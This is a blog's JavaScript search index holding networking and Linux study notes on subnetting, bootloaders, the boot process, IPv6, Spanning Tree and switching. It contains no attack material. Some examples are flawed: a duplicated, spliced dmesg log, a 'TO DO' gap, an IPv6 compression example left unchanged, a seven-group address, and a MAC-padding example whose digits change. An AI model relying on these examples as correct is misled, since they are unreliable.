
var documents = [{
    "id": 0,
    "url": "/404.html",
    "title": "404",
    "body": "404 Page not found!Please use the search bar from the bottom left or visit our homepage! "
    }, {
    "id": 1,
    "url": "/about",
    "title": "Who am I ?",
    "body": "Facebook :seifallahhomrani1 Instagram :seifallahhomrani1 Twitter :seifallah1 THM : pu71n WeChall seifallahhomrani1 HTB: seifallah1 “This is it… this is where I belong…”I know everyone here… even if I’ve never met them, never talked tothem, may never hear from them again… I know you all… "
    }, {
    "id": 2,
    "url": "/categories",
    "title": "Categories",
    "body": ""
    }, {
    "id": 3,
    "url": "/contact",
    "title": "Contact",
    "body": "  Please send your message to {{site. name}}. We will reply as soon as possible!   "
    }, {
    "id": 4,
    "url": "/",
    "title": "Home",
    "body": "  {% for post in paginator. posts %}    {% include postbox. html %}  {% endfor %}  {% include pagination. html %}"
    }, {
    "id": 5,
    "url": "/robots.txt",
    "title": "",
    "body": "      Sitemap: {{ “sitemap. xml”   absolute_url }}   "
    }, {
    "id": 6,
    "url": "/page2/",
    "title": "Home",
    "body": "  {% for post in paginator. posts %}    {% include postbox. html %}  {% endfor %}  {% include pagination. html %}"
    }, {
    "id": 7,
    "url": "/page3/",
    "title": "Home",
    "body": "  {% for post in paginator. posts %}    {% include postbox. html %}  {% endfor %}  {% include pagination. html %}"
    }, {
    "id": 8,
    "url": "/page4/",
    "title": "Home",
    "body": "  {% for post in paginator. posts %}    {% include postbox. html %}  {% endfor %}  {% include pagination. html %}"
    }, {
    "id": 9,
    "url": "/page5/",
    "title": "Home",
    "body": "  {% for post in paginator. posts %}    {% include postbox. html %}  {% endfor %}  {% include pagination. html %}"
    }, {
    "id": 10,
    "url": "/page6/",
    "title": "Home",
    "body": "  {% for post in paginator. posts %}    {% include postbox. html %}  {% endfor %}  {% include pagination. html %}"
    }, {
    "id": 11,
    "url": "/page7/",
    "title": "Home",
    "body": "  {% for post in paginator. posts %}    {% include postbox. html %}  {% endfor %}  {% include pagination. html %}"
    }, {
    "id": 12,
    "url": "/page8/",
    "title": "Home",
    "body": "  {% for post in paginator. posts %}    {% include postbox. html %}  {% endfor %}  {% include pagination. html %}"
    }, {
    "id": 13,
    "url": "/vlsm/",
    "title": "Subnets",
    "body": "2021/03/13 - Introduction: When you define only one network, what happens if you wanted to take one network address and create six networks from it? You would have to do something called subnetting, because that’s what allows you to take one larger network and break it into a bunch of smaller networks. There are loads of reasons if favor of subnetting, including the following benefits:    Reduced network traffic     Optimized network performance     Simplified management     Facilitated spanning of large geographical distances  How to Create Subnets: To create subnetworks, you take "
    }, {
    "id": 14,
    "url": "/Linux_bootloaders/",
    "title": "Linux Bootloaders",
    "body": "2021/03/07 - Linux Bootloaders: The bootloader program helps bridge the gap between the system firmware and the full Linux operating system kernel. In Linux, you have many choices of bootloaders. The most popular ones that you’ll run across are these :  Linux Loader (LILO) Grand Unified Bootloader (GRUB) Legacy GRUB2In the original versions of Linux, the Linux Loader (LILO) bootloader was the only one available. It was extremely limited in what it could do, but it accomplished its purpose, that is, loading the Linux kernel from the BIOS startup. LILO became the default bootloader used by Linux distributions in the 1990s. The LILO configuration file is stored in a single file, UEFI, /etc/lilo. conf, which defines the systems to boot. Unfortunately, LILO doesn’t work with UEFI systems, so it has limited use on modern systems and is quickly fading into history. The first version of the GRUB bootloader (now called GRUB Legacy) was created in 1999 to provide a more robust and configurable bootloader to replace LILO. GRUB quickly became the default bootloader for all linux distributions, whether they run on BIOS or UEFI systems. GRUB2 was created in 2005 as a total rewrite of the GRUB Legacy system. It supports advanced features, such as the ability to load hardware driver modules and use logic statements to alter the boot menu options dynamically, depending on conditions detected on the system (such as if an external hard drive is connected). GRUB Legacy: GRUB Legacy allows you to select multiple kernels and /or operating systems using a menu interface as well as an interactive shell. You configure the menu interface to provide options for each kernel or operating system you wish to boot. The interactive shell provides a way for you to customize boot commands on the fly. Both the menu and the interactive shell utilize a set of commands that control features of the bootloader. Configuring GRUB Legacy: When you use the GRUB Legacy interactive menu, you need to tell it what options to show. You do that using special GRUB menu commands. The GRUB Legacy system stores the menu commands in a standard text configuration file. The configuration file used by GRUB Legacy is menu. lst, and it is stored in the /boot/grub folder. (While not a requirement, some Linux Distributions create a separate /boot partition on the hard drive. ) Red Hat-derived Linux distributions (such as CentOS and Fedora) use grub. conf for the configuration file. The GRUB Legacy configuration file consists of two sections:  Global definitions Operating system boot definitionsThe global definitions section defines commands that control the overall operation of the GRUB Legacy boot menu. The global definitions must appear first in the configuration file. There are only handful of global settings. GRUB 2: Since the GRUB2 system was intended as an improvement over GRUB Legacy, many of the features are the same, with just a few twists. For example, the GRUB2 system changes the configuration filename to grub. cfg, and it stores it in the /boot/grub/ folder. (This allows you to have both GRUB Legacy and GRUB2 installed at the same time. ) Configuring GRUB2: There are also a few changes to the commands used in GRUB2. FOr example, instead of the title command, GRUB uses the menuentry command, and you must also enclose each individual boot section within braces immediately following the menuentry command. Here’s an example of a GRUB2 configuration file: menuentry  CentOS Linux {  set root=(hd1,1)  linux /boot/vmlinuz  initrd /initrd}menuentry  Windows  {  set root=(hd0,1)}The configuration process for GRUB2 is also somewhat different. While GRUB2 uses the /boot/grub/grub. cfg file as the configuration file, you should never modify that file. Instead, there are seperate configuration files stored in the /etc/grub. d folder. This allows you (or the system) to create individual configuration files for each boot option installed on your system (for example, one configurationo file for booting Linux and another for booting Windows). Installing GRUB2: Unlike GRUB Legacy, you don’t need t install GRUB2. All you need to do is to rebuild the main installation file by running the grub-mkconfig program to the grub. cfg configuration file or use the -o option to specify the output file. By default, the grub-mkconfig program just outputs the new configuration file commands to standard output. Alternative Bootloaders: While GRUB Legacy and GRUB2 are the most popular Linux bootloader programs, you may run into a few others, depending on which Linux distributions you are using. The Systemd-boot bootloader program is starting to gain popularity in Linux Distributions that use the systemd init method. "
    }, {
    "id": 15,
    "url": "/LPIC/",
    "title": "Linux Boot Process ",
    "body": "2021/03/04 - Introduction: When you on the power to your linux system, it triggers a series of events that eventually leads to the login prompt. There may be times when your linux systel doesn’t boot quite correctly, or perhaps an application that you expected to be running in background mode isn’t running. In those situations, it helps to have a basic understanding of how Linux boots the operating system and starts programs so that you can troubleshoot the problem. Following the Boot Process: The linux boot process can be split into three main steps:    The workstation firmware starts, performing a quick check of the hardware, called a Power-On-Self Test (POST), and then it looks for a bootloader program to run from a bootable device.     The bootloader runs and determines what Linux kernel program to load.     The kernel program loads into memory and starts the necessary background programs required for the system to operate (such as a graphical desktop manager for desktops or web and database servers for servers. )  These 3 steps might seem so simple on the surface, but a somewhat complicated ballet of operations happens behind the scenes to keep the boot process working. Each step performs several actions as it prepares your system to run Linux. Viewing the Boot Process: You can monitor the Linux boot process by watching the system console screen as the system boots. You’ll see lots of informative messages scroll by as the system detects hardware and loads the software. Usually the boot messages scroll by somewhat quickly, and it’s hard to see just what’s happening. If you need to troubleshoot boot problems, you can review the boot-time messages using the dmesg command. Most Linux distributions copy the boot kernel messages into a special ring buffer in memory called the kernel ring buffer. The buffer is circular and set to a predetrmined size. As new messages are logged into the buffer, older messages are rotated out. The dmesg command displays the most recent boot messages that are currently stored in the kernel ring buffer : [  0. 000000] microcode: microcode updated early to revision 0x2f, date = 2019-11-12[  0. 000000] Linux version 5. 4. 0-66-generic (buildd@lgw01-amd64-016) (gcc version 7. 5. 0 (Ubuntu 7. 5. 0-3ubuntu1~18. 04)) #74~18. 04. 2-Ubuntu SMP Fri Feb 5 11:17:31 UTC 2021 (Ubuntu 5. 4. 0-66. 74~18. 04. 2-generic 5. 4. 86)[  0. 000000] Command line: BOOT_IMAGE=/boot/vmlinuz-5. 4. 0-66-generic root=UUID=735fb175-3ba7-44e8-9308-b1edab99ff24 ro quiet splash[  0. 000000] KERNEL supported cpus:[  0. 000000]  Intel GenuineIntel[  0. 000000]  AMD AuthenticAMD[  0. 000000]  Hygon HygonGenuine[  0. 000000]  Centaur CentaurHauls[  0. 000000]  zhaoxin  Shanghai [  0. 000000] x86/fpu: Supporting XSAVE feature 0x001: 'x87 floating point registers'[  0. 000000] x86/fpu: Supporting XSAVE feature 0x002: 'SSE registers'[  0. 000000] x86/fpu: Supporting XSAVE feature 0x004: 'AVX registers'[  0. 000000] x86/fpu: xstate_offset[2]: 576, xstate_sizes[2]: 256[  0. 000000] x86/fpu: Enabled xstate features 0x7, context size is 832 bytes, using 'standard' format. [  0. 000000] BIOS-provided physical RAM map:[  0. 000000] BIOS-e820: [mem 0x0000000000000000-0x000000000009e7ff] usable[  0. 000000] BIOS-e820: [mem 0x000000000009e800-0x000000000009ffff] reserved[  0. 000000] BIOS-e820: [mem 0x00000000000e0000-0x00000000000fffff] reserved[  0. 000000] BIOS-e820: [mem 0x0000000000100000-0x000000008ecb8fff] usable[  0. 000000] BIOS-e820: [mem 0x000000008ecb9000-0x000000008f5b8fff] reserved[  0. 000000] BIOS-e820: [mem 0x000000008f5b9000-0x000000009c9cdfff] usable[  0. 000000] microcode: microcode updated early to revision 0x2f, date = 2019-11-12[  0. 000000] Linux version 5. 4. 0-66-generic (buildd@lgw01-amd64-016) (gcc version 7. 5. 0 (Ubuntu 7. 5. 0-3ubuntu1~18. 04)) #74~18. 04. 2-Ubuntu SMP Fri Feb 5 11:17:31 UTC 2021 (Ubuntu 5. 4. 0-66. 74~18. 04. 2-generic 5. 4. 86)[  0. 000000] Command line: BOOT_IMAGE=/boot/vmlinuz-5. 4. 0-66-generic root=UUID=735fb175-3ba7-44e8-9308-b1edab99ff24 ro quiet splash[  0. 000000] KERNEL supported cpus:[  0. 000000]  Intel GenuineIntel[  0. 000000]  AMD AuthenticAMD[  0. 000000]  Hygon HygonGenuine[  0. 000000]  Centaur CentaurHauls[  0. 000000]  zhaoxin  Shanghai [  0. 000000] x86/fpu: Supporting XSAVE feature 0x001: 'x87 floating point registers'[  0. 000000] x86/fpu: Supporting XSAVE feature 0x002: 'SSE registers'[  0. 000000] x86/fpu: Supporting XSAVE feature 0x004: 'AVX registers'[  0. 000000] x86/fpu: xstate_offset[2]: 576, xstate_sizes[2]: 256[  0. 000000] x86/fpu: Enabled xstate features 0x7, context size is 832 bytes, using 'standard' format. [  0. 000000] BIOS-provided physical RAM map:[  0. 000000] BIOS-e820: [mem 0x0000000000000000-0x000000000009e7ff] usable[  0. 000000] BIOS-e820: [mem 0x000000000009e800-0x000000000009ffff] reserved[  0. 000000] BIOS-e820: [mem 0x00000000000e0000-0x00000000000fffff] reserved[  0. 000000] BIOS-e820: [mem 0x0000000000100000-0x000000008ecb8fff] usable[  0. 000000] BIOS-e820: [mem 0x000000008ecb9000-0x000000008f5b8fff] reserved[  0. 000000] BIOS-e820: [mem 0x000000008f5b9000-0x000000009c9cdfff] usable[  0. 000000] BIOS-e820: [mem 0x000000009c9ce000-0x000000009cebdfff] reserved[  0. 000000] BIOS-e820: [mem 0x000000009cebe000-0x000000009cfbdfff] ACPI NVS[  0. 000000] BIOS-e820: [mem 0x000000009cfbe000-0x000000009cffdfff] ACPI data[  0. 000000] BIOS-e820: [mem 0x000000009cffe000-0x000000009cffefff] usablee000-0x000000009cffdfff] ACPI data[  0. 000000] BIOS-e820: [mem 0x000000009cffe000-0x000000009cffefff] usableMost linux distributions also store the boot messages in a log file, usually in the /var/log folder. For debian-based systems, the file is usually /var/log/boot. Although it helps to be able to see the different messages generated during boot time, it is also helpful to know just what generates those messages. The Firmware Startup: All IBM-compatible workstations and servers utilize some type of built-in firmware to control how the installed operating system starts. On older workstations and servers, this firmware was called the Basic Input/Output System (BIOS). On newer workstations and servers, a new method, called the *Unified Extensible Firmware Interface (UEFI) * is responsible for maintaining the system hardware status and launching an installed operating system. Both methods eventually launch the main operating system program, however, and each method uses different ways of doing that. The BIOS Startup: The BIOS firmware found in older workstations and servers was somewhat limited in what it could do. The BIOS firmware had a simplistic menu interface that allowed you to change some settings to control how the system found hardware and define what device the BIOS should use to start the operating system. One of the limitations of the original BIOS firmware was that it could read only one sector’s worth of data from a hard drive into memory in order to run. As you can probably guess, that’s not enough space to load an entire operating system. To get around that limitation, most operating systems (including Linux and Microsoft Windows) split the boot process into two parts. First, the BIOS runs a bootloader program, The bootloader is a small program that initializes the necessary hardware to find and run the full operating system, which is usually found at another location on the same hard drive but sometimes situated on a separate internal or external storage device. The bootloader program usually has a configuration file, so you can tell it where to find tha actual operating system file to run or even to produce a small menu allowing the user to boot between multiple operating systems. To get things started, the BIOS must know where to find the bootloader program on ab installed storage device. Most BIOS setups allow you yo load the bootloader program from several locations (internal/external hard drive, CD/DVD, etc. . ) When booting from a hard drive, you must designate which hard drive, and which partition on the hard drive, the BIOS should load the bootloader program from. This is done by defining a Master Boot Record (MBR). The MBR is the first sector on the first hard drive partition on the system. There is only one MBR for the computer system. The BIOS looks for the MBR and reads the program stored there into memory. Since the bootloader program must fit in one sector, it must be very small, so it can’t do much. The bootloader program mainly points to the location of the actual operating system kernel file, which is stored in a boot sector of a separate partition on the system. There are no size limitations on the kernel boot file. The bootloader program isn’t required to point directly to an operating system kernel file, it can point to any type of program including another bootloader program. You can create a primary bootloader program that points to a secondary bootloader program, which provides options to load multiple operating systems. This process is called chainloading. The UEFI Startup: While there were plenty of limitations with BIOS, computer manufactures learned to live with them, and BIOS was the default standard for IBM compatible systems for many years. However, as operating systems became more complicated, it eventually became clear that a new boot method needed to be developed. Intel created the Extensible Firmware Interface (EFI) in 1998 to address some of the limitations of BIOS. The adoptions of EFI was somewhat of a slow process, but by 2005 the idea caught on with other vendors, and the Universal EFI (UEFI) specification was adopted as a standard. These days just about all IBM-compatible desktop and server systems utilize the UEFI firmware standard. Instead of relying on a single boot sector on a hard drive to hold the bootloader program, UEFI specifies a special disk partition, called the EFI system partition (ESP) to store bootloader programs. This allows for any size of bootloader program, plus the ability to store multiple bootloader programs for multiple operating systems. The ESP setup utilizes the old Microsoft File Allocation Table (FAT) filesystem to store the bootloader programs. On Linux Systems, the ESP is typically mounted in the /boot/efi folder, and the bootloader files are typically stored using the . efi filename extension. The UEFI firmware utilizes a built-in mini bootloader (sometimes referred to as a boot manager), which allows you to configure just which bootloader program file to launch.  Not all linux distributions support the UEFI firmware, it you’re using a UEFI system, make sure that the linux distribution you select supports it. With UEFI, you need to register each individual bootloader file that you want to appear at boot time in the boot manager interface menu. The efibootmgr Linux application allows you to create and remove boot entries or change the boot order. The UEFI interface includes a shell environment, allowing you to enter commands to alter boot settings, or select the bootloader to run each time you boot the system. Once the firmware finds and runs the bootloader, its job is done. "
    }, {
    "id": 16,
    "url": "/IPV6/",
    "title": "IPV6",
    "body": "2021/02/08 - Introduction: IPV6 is the latest version of the internet Protocol, people refer to IPV6 as “the next-generation Internet Protocol” and it was originally created as the answer to IPv4’s inevitable, looming address-exhaustion crisis. The IPv6 header and address structure has been completely overhauled, and many of the features that were basically just afterthoughts and addendums in IPv4 are now included as full-blown standards in IPv6. It’s seriously well equiped, poised, and ready to manage the mind-blowing demands of the Internet to come. Why Do We Need IPv6 ?: Well, the short answer is, because we need to communicate, and our current system isn’t really cutting it anymore, kind of like how the Pony Express can’t compete with airmail. Just look at how much time and effort we’ve invested in coming up with slick new ways to conserve bandwidth and IP addresses. We’ve even come up with Variable Length Subnet Masks (VLSMs) in our struggle to overcome the worsening address drought. The Benefits and Uses of IPv6: So what’s so fa TO DO IPv6 Addressing and Expressions: Just as understanding how IP addresses are structured and used is critical with IPv4 addressing, it’s also vital when it comes to IPv6. You’ve already read about the fact that at 128 bits, and IPv6 address is much larger than an IPv4 address. Here’s an example of an IPv6 address : 2001:0db8:3c4d:0012:0000:0000:1234:56ab Breaking down this IPv6 address into 3 sections :  Global Prefix : 2001:0db8:3c4d Subnet : 0012 Interface ID : 0000:0000:1234:56abSo as you can now see, the address is truly much larger, but what else is different? Well, first, notice that it has eight groups of numbers instead of four and also that those groups are separated by colons instead of periods. And hey wait a second. . There are letters in that address! Yep, the address is expressed in hexadecimal just like a MAC address is, so you could say this address has eight 16-bit hexadecimal colon-delimited blocks. That’s already quite a mouthful, and you probably haven’t even tried to say the address out loud yet! One other thing I want to point out us for when you set up your test network to play with IPv6, is when you use a web browser to make an HTTP connection to an IPv6 device, you have to type the address into the browser with brackets [] around the literal address. Why ? Well, a colon is already being used by the browser for specifying a port number. So basically, if you don’t enclose the address in brackets, the browser will have no way to identify the information. Shortened Expression: The good news is there are a fex tricks to help rescue us when writing these monster addresses. For one thing, you can actually leave out parts of the address to abbreviate it, but to get away with doing that you have to follow a couple of rules. First, you can drop any leading zeros in each of the individual blocks. After you do that, the sample address from earlier would then look like this: 2001:db8:3c4d:12:0:0:1234:56ab Okay, that’s a definite improvement, at least we don’t have to write all of those extra zeros!But what about whole blocks that don’t have anything in them except zeros? Well, we can kind of lose those too, at least some of them. Again referring to our sample address, we can remove the two blocks of zeros by replacing them with double colons, like this: 2001:db8:3c4d:12:0:0:1234:56ab Cool, we replaced the blocks of all zeros with double colons. The rule you have to follow to get away with this is that you can only replace one contiguous block of zeros in an address. So if my address has four blocks of zeros and each of them were separated, I just don’t get to replace them all; remember the rule is that you can only replace one contiguous block with a double colon. Check out this example : 2001:0000:0000:0012:0000:1234:56ab And just know that you can’t do this: 2001::12::1234:56ab Instead, this is the best that you can do: 2001::12:0:0:1234:56ab The reason why the above example is our best shot is that if we remove two sets of zeros, the device looking at the address will have no way of knowing where the zeros go back in. Basically, the router would look at the incorrect address and say, “Well, do I place two blocks into the first set of double colons and two into the second st, or do I place three blocks into the first set and one block into the second set?” and on and on it would go because the information the router needs just isn’t there. Address Types: We’re all familiar with IPv4’s unicast, broadcast, and multicast addresses that basically define who or at least how many other devices we’re talking to. But, the IPv6 adds to that trio and introduces the anycast. Broadcasts, as we know them, have been eliminated in IPv6 because of their cumbersome inefficiency. So let’s find out what each of these types of IPv6 addressing and communication methods do for us.    Unicast : Packets addressed to a unicast address are delivered to a single interface. For load balancing, multiple interfaces can use the same address. There are a few different types of unicast addresses, but we don’t need to get into here.     Global Unicast Addresses These are your typical publicly routable addresses, and they’re the same as they are in IPv4.     Link-Local addresses These are like the private addresses in IPv4 in that they’re not meant to be routed. Think of them as a handy tool that gives you the ability to throw a temporary LAN together or for creating a small LAN that’s not going to be routed but still needs to share and access files and services locally.     Unique local addresses These addresses are also intended for non-routing purposes, but they are nearly globally unique, so it’s unlikely you’ll ever have one of them overlap. Unique local addresses were designed to replace site-local addresses, so they basically do almost exactly what IPv4 private addresses do : allow communication throughout a site while being routable to multiple local networks. Site-local addresses were denounced as of September 2004.     Multicast Again, same as in IPv4, packets addresses to a multicast address are delivered to all interfaces identified by the multicast address. Sometimes people call them one-to-many addresses. It’s really easy to spot a multicast address in IPv6 because they always start with FF.     Anycast Like multicast addresses, an anycast address identifies multiple interfaces, but there’s a big difference: the any cast packet is only delivered to one address, actually, to the first one it finds defined in terms of routing distance. And again, this address is special because you can apply a single address to more than one interface. You could call them one-to-one-of-many addresses, but just saying “anycast” is a lot easier.  You’re probably wondering if there are any special, reserved addresses in IPv6 because you know they’re in IPv4. Well there are plenty of them ! Let’s go over them now. Special Addresses: I’m going to list some of the addresses and address ranges that you should definitely make a point to remember because you’ll eventually use them. They’re all special or reserved for specific use, but unlike IPv4, IPv6 gives us a galaxy of addresses, so reserving a few here and there doesn’t hurt a thing! 0:0:0:0:0:0:0:0 Equals ::. This is the equivalent of IPv4’s 0. 0. 0. 0, and is typically the source address of a host when you’re using stateful configuration. 0:0:0:0:0:0:0:1 Equals ::1. The equivalent of 127. 0. 0. 1 in IPv4. 0:0:0:0:0:0:192. 168. 100. 1 This is how an IPv4 address would be written in a mixed IPv6/IPv4 network environment. 2000::/3 The global unicast address range. FC00::/7 The unique local unicast range. FE80::/10 The link-local unicast range. FF00::/8 The multicast range. 3FFF:FFFF::/32 Reserved for examples and documentation. 2001:0DB8::/32 Also reserved for examples and documentation 2002::/16 Used with 6to4 , which is the transition system, the structure that allows IPv6 packets to be transmitted over an IPv4 network without the need to configure explicit tunnels. How IPv6 Works in an InternetWork: It’s time to explore the finer points of IPv6. A great place to start is by showing you how to address a host and what gives it the ability to find other hosts and resources on a network. I’ll also demonstrate a device’s ability to automatically address itself, something called stateless autoconfiguration, plus another type of autoconfiguration known as stateful. Keep in mind that stateful autoconfiguration uses a DHCP server in a very similar way to how it’s used in an IPv4 configuration. I’ll also show you how Internet Control Message Protocol (ICMP) and multicast works for us on an IPv6 network. Autoconfiguration: Autoconfiguration is an incredibly useful solution because it allows devices on a network to address themselves with a link-local unicast address. This process happens through first learning the prefix information from the router and then appending the device’s own interface address as the interface ID. But where does it get that interface ID? Well, you know every device on an Ethernet network has a physical MAC address, and that’s exactly what’s used for the interface ID. But since the interface ID in an IPv6 is 64 bits length and a MC address is only 48 bits, where do the extra 16 bits come from? The MAC address is padded in the middle with the extra bits, it’s padded with FFFE. For example, let’s say I have a device with a MAC address that looks like this: 00:60:d6:79:19:87 After it’s been padded, it would look like this: 02:60:d6:FF:FE:73:19:87 So where did that 2 in the beginning of the address come from ? another good question. You see, part of the process of padding (called modified eui-644 format) changes a bit to specify if the address is locally unique or globally unique. And the bit that gets changed is the seventh bit in the address. A bit value of 1 means globally unique, and a bit value of 0 means locally unique, so looking at this example, would you say that this address is globally or locally unique? If you answered that it’s globally unique address, you’re right! Trust me, this is going to save you time in addressing your hosts machines because they communicate with the router to make this happen. To perform autoconfiguration, a host goes through a basic twi-step process:    First, the host needs the prefix information (similar to the network portion of an IPv4 address) to configure its interface, so it sends a router solicitation (RS) request for it. This RS is then sent out as a multicast to each router’s multicast address. The actual information being sent is a type of ICMP message, and like everything in networking, this ICMP message has a number that identifies it. The RS message is ICMP type 133.     The router answers back with the required prefix information via a router advertisement (RA). An RA message also happens to be a multicast packet that’s sent to each nod’s multicast address and is ICMP type 134. RA messages are sent on a periodic basis, but the host sends the RS for an immediate response so it doesn’t have to wait until the next scheduled RA to get what it needs.  By the way, this type of autoconfiguration is also know as stateless autoconfiguration because it doesn’t contact or connect any further information from the other device. "
    }, {
    "id": 17,
    "url": "/STP/",
    "title": "Spanning Tree Protocol",
    "body": "2021/01/24 - Introduction: Once upon a time, a company called Digital Equipment Corporation (DEC) was purchased and renamed Compaq. But before that happened, DEC created the original version of Spanning Tree Protocol, or STP. Main task of STP: STP’s main task is to stop network loops from occurring on your layer 2 network (bridges or switches). It vigilantly monitors the network to find all links, making sure that no loops occur by shutting down any redundant links. STP uses the spanning-tree algorithm (STA) to first create a topology database and then search out and destroy redundant links. With STP running, frames will be forwarded only on the premium, STP-picked links. Spanning Tree Terms: Before I get into describing the details of how STP works in the network, you need to understand some basic ideas and terms and how they relate within the layer 2 switched network:    Root bridge : The root bridge is the bridge with the best bridge ID. With STP, the key is for all the switches in the network to elect a root bridge that becomes the focal point in the network. All other decisions in the network, such as which port is to be blocked and which port is to be put in forwarding mode, are made from the perspective of this root bridge.     BPDU : All the switches exchange information to use in the selection of the root switch as well as in subsequent configuration of the network. Each switch compares the parameters in the Bridge Protocol Data Unit (BPDU) that it sends to one neighbor with the one that it receives from another neighbor.     Bridge ID : The bridge ID is how STP keeps track of all the switches in the network. It is determined by a combination of the bridge priority and the base MAC address. The bridge with the lowest bridge ID becomes the root bridge in the network.     Nonroot bridges : These are all bridges that are not the root bridge. Nonroot bridges exchange BPDUs with all bridges and update the STP topology database on all switches, preventing loops and providing a measure of defense against link failures.     Port cost : Port cost determines the best path when multiple links are used between two switches and none of the links is a root port. The cost of a link is determined by the bandwidth of a link.     Root port : The root port is always the link directly connected to the root bridge, or the shortest path to the root bridge. If more than one link connects to root bridge, then a port cost is determined by checking the bandwidth of each link. The lowest-cost port becomes the root port. If multiple links have the same cost, the bridge with the lower advertising bridge ID is used. Since multiple links can be from the same device, the lowest port number will be used.     Designated port : A designated port is one that has been determined as having the best (lowest) cost. A designated port will be marked as a forwarding port.     Nondesignated port : A nondesignated port is one with a higher cost than the designated port. Nondesignated ports are put in blocking mode - they are not forwarding ports.     Forwarding port : A forwarding port forwards frames.     Blocked port : A blocked port is the port that, in order to prevent loops, will not forward frames. However, a blocked port will always listen to frames.  Spanning Tree Operations: As I’ve said before, STP’s job is to find all links in the network and shut down any redundant ones, thereby preventing network loops from occurring. STP accomplishes this by first electing a root bridge that will forward through all ports and act as a point of reference for all other devices in the STP domain. Once all switches agree on who the root bridge is, every bridge must find its one and only allotted root port. Each and every link between two switches must have one, and only one, designated port, the port on that link that provides the highest bandwidth to the root. It’s really important to remember that a bridge can go through many other bridges to get to the root, meaning that it’s not always the shortest path but the fastest (highest bandwidth) path that will be the one used. Obviously, every port on the root switch is a designated port, as you can get no closer to the root than being the root. After the dust settles, any port that is not either root port or a designated port - which means it is a nonroot, nondesignated port - is placed in the blocking state, thus breaking the switching loop. Selecting the Root Bridge: The bridge ID is used to elect the root bridge in the STP domain and to determine the root port for each of the remaining devices in the STP domain. This ID is 8 bytes long and includes both the priority and the MAC address of the device. The default priority on all devices running the IEEE STP version is 32. 768. To determine the root bridge, you combine the priority of each bridge with its MAC address. If two switches or bridges happen to have the same priority value, the MAC address becomes the tiebreaker for figuring out which one has the lowest (best) ID. It’s like this: If two switches - I’ll name them A and B - Both use the default priority of 32768, then the MAC address will be used instead. Just remember that the lower value is the better one when it comes to electing a root bridge. By default, BPDUs are sent every two seconds out all active ports on a bridge/switch - again, the bridge with the lowest bridge ID is elected the root bridge. You can change the bridge’s ID by lowering its priority so that it will become a root bridge automatically. Being able to do that is important in a large switched network, it ensures that the best paths are chosen, efficiency is what you’re after here. To determine which port STP will shut down, it will first check each link’s amount of bandwidth and then shut down the link with the lowest bandwidth value. If both links have the same bandwidth value, STP will typically shut down the higher of the port numbers. "
    }, {
    "id": 18,
    "url": "/Switching_services/",
    "title": "Switching Services",
    "body": "2021/01/23 - Introduction: Unlike bridges, which use software to create and manage a filter table, switches use application specific integrated circuits ASICsto build and maintain their filter tables. But it’s still okay to think of a layer 2 switch as a multiport bridge because their basic reason for being is the same: to break up collision domains. Layer 2 switches and bridges are faster than routers becuase they don’t take up time looking at the Network layer header information, Instead, they look at the frame’s hardware addresses before deciding to either forward, flood, or drop the frame. Switches create private, dedicated collision domains and provide independent bandwidth on each port, unlike hubs. Take an example of multiple hosts connected with a switch to a server using 100Mbps Half-duplex link, unlike with a hub, each host has 10 Mbps dedicated communication to the server. Layer 2 switching provides the following :  Hardware-based bridging (ASIC).  Wire speed Low latency Low costWhat makes layer 2 switching so efficient is that no modification to the data packet takes place. The device only reads the frame encapsulating the packet, which makes the switching process considerably faster and less error-prone than routing processes are. Bridging vs LAN Switching: It’s true - layer 2 switches really are pretty much just bridges that give us a lot more ports, but there are some important differences you should always keep in mind:  Bridges are software based, while switches are hardware based because they use ASIC chips to help make filtering decisions.  A switch can be viewed as a multiport bridge.  There can be only one spanning-tree instance per bridge, while switches can have many.  Switches have a higher number of ports than most bridges.  Both bridges and switches forward layer 2 broadcasts.  Bridges and switches learn MAC addresses by examining the sources address of each frame received.  Both bridges and switches make forwarding decisions based on layer 2 addresses. Three Switch Functions at Layer 2: There are three distinct functions of layer 2 switching (you need to remember these!):Address learning, forward/filter decisions, and loop avoidance.    Address learning : Layer 2 switches and bridges remember the source hardware address of each frame received on an interface, and they enter this information into a MAC database called a forward/filter table.     Forward/Filter decisions : When a frame is received on an interface, the switch looks at the destination hardware address and finds the exit interface in the MAC database. The frame is only forwarded out the specified destination port.     Loop avoidance : If multiple connections between switches are created for redundancy purposes, network loops can occur. Spanning Tree Protocol (STP) is used to stop network loops while still permitting redundancy.  Address Learning: When a switch is first powered on, the MAC forward/filter table is empty.  When a device transmits and an interface receives a frame, the switch places teh fram’s source address in the MAC forward/filter table, allowing it to remember which interface teh sending device is locate on. The switch then has no choice but to flood the network with this frame out of every port except the source port because it has no idea where the destination device is actually located. If a device answers this flooded frame and sends a frame back, then the switch will take the source address from that frame and place that MAC address in its database as well, association this MAC address with the interface that received the frame. Since the switch now has both of the relevant MAC adresses in its filtering table, the two devices can now make a point-to-point connection. The switch doesn’t need to flood the frame as it did the time because now the frames can and will be forwarded only between the two devices. This is exactly the thing that makes layer 2 switches better than hubs. Forward/Filter Decisions: When a frame arrives at a switch interface, the destination hardware address is compared to the forward/filter MAC database. If the destination hardware address is known and listed in the database, the frame is only sent out the correct interface. The switch doesn’t transmit the frame out any interface except for the destination interface. This preserves bandwidth on the other network segments and is called frame filtering. But if the destination hardware address is not listed in the MAC database, then the frame is flooded out all active interfaces except the interface the frame was received on. If a device answers the flooded frame, the MAC database is updated with the device’s location (interface). If a host or server sends a broadcast on the LAN, the switch will flood the frame out all active ports except the source port by default. Remember, the switch creates smaller collision domains, but it’s still one large broadcast domain by default. Port Security: So just how do you stop someone from simply plugging a host into one of your switch ports, or worse, adding a hub, switch, or access point into the Ethernet jack in their office? By default, MAC addresses will just dynamically appear in your MAC forward/filter database. You can stop them in their tracks by using port security. Loop Avoidance: Redundant links between switches are a good idea because they help prevent complete network failures in the event one link stops working. Sounds great, but even though redundant links can be extremely helpful, they often cause more problems than they solve. This is because frames can be flooded down all redundant link simultaneously, creating network loops as well as other evils. Here’s a list of the ugliest problems:    If no loop avoidance schemes are put in place, the switches will flood broadcasts endlessly throughout the internetwork. This is sometimes referred to as a broacast storm.     A device can receive multiple copies of the same frame since that frame can arrive from different segments at the same time.     You may have thought of this one: The MAC address filter table could be totally confused about the device’s location because the switch can receive the frame from more than one link. And what’s more, the bewildered switch could get so caught up in constantly updating the MAC filter table with source hardware address locations that it will fail to forward a frame! This is called thrashing the MAC table.     One of the nastiest things that can happen is multiple loops generating throughout a network. This means that loops can occur within other loops, and if a broadcast storm were to also occur, the network wouldn’t be able to perform frame switching !  All of these problems spell disaster (or at least close to it) and are decidedly evil situations that must be avoided, or at least fixed somehow. That’s where the Spanning Tree Protocol comes into the game. It was developed to solve 